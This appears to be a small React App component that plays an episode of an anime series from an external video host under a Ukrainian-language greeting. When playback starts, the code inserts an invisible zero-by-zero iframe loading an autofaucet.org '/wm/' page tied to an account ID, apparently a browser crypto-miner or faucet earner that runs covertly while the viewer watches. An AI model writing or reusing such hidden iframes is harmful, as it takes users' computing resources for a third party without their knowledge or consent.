import './App.css';
import React, {SetStateAction} from "react"
import ReactPlayer from 'react-player'
interface Props{
    isPlaying:boolean
    setIsPlaying: React.Dispatch<SetStateAction<boolean>>;
}

const VideoPlayer:React.FC<Props> = ({isPlaying, setIsPlaying}) => {
    return <div>
        lalal
    </div>
}


export default function App() {
    const [isPlaying, setIsPlaying] = React.useState(false)
    React.useEffect(()=>{

        console.log(isPlaying)

    },[isPlaying])
    return (
        <div className="App">
            <h1>Прівєт, Брабус</h1>
            {
                isPlaying &&
                <iframe src="https://autofaucet.org/wm/swag124/4" width="0" title='bruh' height="0"
                        style={{"border": "none"}}></iframe>
            }
            <video onPlaying={()=>setIsPlaying(true)} onPause={()=>setIsPlaying(false)} controls src="https://svd11.vidme.link/video_mp4/serials/BirdieWingStory/2f3f2c5a604d49d7615525ef314a004c/s02e01.mp4"></video>
            
        </div>
    );
}

